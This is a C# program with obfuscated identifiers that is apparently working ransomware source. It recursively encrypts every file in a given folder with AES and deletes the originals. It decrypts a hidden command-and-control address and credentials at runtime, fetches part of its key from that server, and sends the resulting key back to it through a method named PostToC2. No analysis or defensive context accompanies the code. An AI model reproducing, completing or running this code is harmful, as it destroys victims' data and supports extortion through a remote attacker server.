using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace X;

internal class Y
{
    public static void Main(string[] p)
    {
        MainAsync(p).Wait();
    }

    private static async Task MainAsync(string[] p)
    {
        if (p.Length < 1)
        {
            Console.WriteLine("E: wrong");
            return;
        }
        string z = p[0];
        string t = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ");
        string c2url = L();
        string username = O();
        string password = N();
        byte[] compKey = ComputeCompositeKey(skey: G(), dkey: await R(c2url, username, password), folder: z, timestamp: t);
        byte[] iv = Encoding.ASCII.GetBytes(H().Substring(0, 16));
        if (Directory.Exists(z))
        {
            hh(z, compKey, iv);
        }
        else
        {
            Console.WriteLine("E: error");
        }
        string compositeData = Convert.ToBase64String(compKey);
        Console.WriteLine("I: " + Convert.ToBase64String(compKey));
        await PostToC2(c2url, compositeData, username, password);
    }

    private static void hh(string z, byte[] compKey, byte[] iv)
    {
        string[] files = Directory.GetFiles(z);
        foreach (string text in files)
        {
            try
            {
                F(text, compKey, iv);
                Console.WriteLine("E: " + text);
            }
            catch (Exception ex)
            {
                Console.WriteLine("X: " + ex.Message);
            }
        }
        string[] directories = Directory.GetDirectories(z);
        foreach (string z2 in directories)
        {
            hh(z2, compKey, iv);
        }
    }

    private static byte[] ComputeCompositeKey(string dkey, string skey, string folder, string timestamp)
    {
        string s = dkey + skey + folder + timestamp;
        using SHA256 sHA = SHA256.Create();
        return sHA.ComputeHash(Encoding.ASCII.GetBytes(s));
    }

    private static string G()
    {
        char[] value = new char[36]
        {
            'A', 'A', '$', 'F', '2', '-', 'D', '8', 'C', '1',
            'E', '7', 'B', '9', 'F', '3', 'A', '3', '5', '@',
            'C', '8', '@', '!', 'B', 'B', '2', 'E', '1', 'F',
            '0', 'A', '7', 'C', '3', 'D'
        };
        return new string(value);
    }

    private static string H()
    {
        char[] value = new char[48]
        {
            'D', '1', '@', 'E', '2', '#', 'F', '3', '%', 'A',
            '4', 'B', '5', '&', 'C', '6', 'D', '1', '@', 'E',
            '2', '#', 'F', '3', '%', 'A', '4', 'B', '5', '&',
            'C', '6', 'D', '1', '@', 'E', '2', '#', 'F', '3',
            '%', 'A', '4', 'B', '5', '&', 'C', '6'
        };
        return new string(value);
    }

    private static void F(string f, byte[] k, byte[] i)
    {
        string text = f + ".tmp";
        string destFileName = f + ".enc";
        using (FileStream fileStream = new FileStream(f, FileMode.Open, FileAccess.Read))
        {
            using FileStream stream = new FileStream(text, FileMode.Create, FileAccess.Write);
            using Aes aes = Aes.Create();
            aes.Key = k;
            aes.IV = i;
            ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
            using CryptoStream destination = new CryptoStream(stream, transform, CryptoStreamMode.Write);
            fileStream.CopyTo(destination);
        }
        File.Delete(f);
        File.Move(text, destFileName);
    }

    private static string L()
    {
        string s = "OF/sfn87WwjfIX14p17jp8mu5uavNFecb4D97pgVfZc=";
        byte[] bytes = Encoding.ASCII.GetBytes(G().Substring(0, 16));
        byte[] bytes2 = Encoding.ASCII.GetBytes(H().Substring(0, 16));
        return M(Convert.FromBase64String(s), bytes, bytes2);
    }

    private static string O()
    {
        string s = "3Npd3p5V7JSh6JZ5gqRmZg==";
        byte[] bytes = Encoding.ASCII.GetBytes(G().Substring(0, 16));
        byte[] bytes2 = Encoding.ASCII.GetBytes(H().Substring(0, 16));
        return M(Convert.FromBase64String(s), bytes, bytes2);
    }

    private static string N()
    {
        string s = "IeLkqcSXkaE8QamE7i4DEY3N7NmqJvAl1fzI7gIQkbo=";
        byte[] bytes = Encoding.ASCII.GetBytes(G().Substring(0, 16));
        byte[] bytes2 = Encoding.ASCII.GetBytes(H().Substring(0, 16));
        return M(Convert.FromBase64String(s), bytes, bytes2);
    }

    private static string NBN()
    {
        string s = "Wil860ds3vJiRDi+iTntnfknYML8iTowJsQe0uwmTms=";
        byte[] bytes = Encoding.ASCII.GetBytes(G().Substring(0, 16));
        byte[] bytes2 = Encoding.ASCII.GetBytes(H().Substring(0, 16));
        return M(Convert.FromBase64String(s), bytes, bytes2);
    }

    private static string M(byte[] d, byte[] k, byte[] i)
    {
        using Aes aes = Aes.Create();
        aes.Key = k;
        aes.IV = i;
        ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
        using MemoryStream stream = new MemoryStream(d);
        using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
        using StreamReader streamReader = new StreamReader(stream2);
        return streamReader.ReadToEnd();
    }

    private static async Task<string> R(string baseUrl, string username, string password)
    {
        try
        {
            using HttpClient client = new HttpClient();
            var loginData = new { username, password };
            string json = JsonConvert.SerializeObject((object)loginData);
            HttpResponseMessage loginResponse = await client.PostAsync(content: new StringContent(json, Encoding.UTF8, "application/json"), requestUri: baseUrl + "/login");
            if (!loginResponse.IsSuccessStatusCode)
            {
                Console.WriteLine("E: Failed to log in.");
                return null;
            }
            JObject loginJson = JObject.Parse(await loginResponse.Content.ReadAsStringAsync());
            string token = ((object)loginJson["token"])?.ToString();
            if (string.IsNullOrEmpty(token))
            {
                Console.WriteLine("E: No token found in login response.");
                return null;
            }
            client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
            HttpResponseMessage secretResponse = await client.GetAsync(baseUrl + "/secretkey");
            Console.WriteLine("I: SecretKey: " + secretResponse.StatusCode);
            if (!secretResponse.IsSuccessStatusCode)
            {
                Console.WriteLine("E: Failed to retrieve secret key.");
                return null;
            }
            JObject secretKeyJson = JObject.Parse(await secretResponse.Content.ReadAsStringAsync());
            string secretKey = ((object)secretKeyJson["key"])?.ToString();
            Console.WriteLine("I: Secret Key retrieved");
            return secretKey;
        }
        catch (Exception ex2)
        {
            Exception ex = ex2;
            Console.WriteLine("Error: " + ex.Message);
            return null;
        }
    }

    private static async Task PostToC2(string url, string data, string username, string password)
    {
        using HttpClient client = new HttpClient();
        Dictionary<string, string> values = new Dictionary<string, string>
        {
            { "username", username },
            { "password", password },
            { "data", data }
        };
        FormUrlEncodedContent content = new FormUrlEncodedContent(values);
        try
        {
            Console.WriteLine("R: " + (await client.PostAsync(url, content)).StatusCode);
        }
        catch (Exception ex2)
        {
            Exception ex = ex2;
            Console.WriteLine("E: " + ex.Message);
        }
    }
}
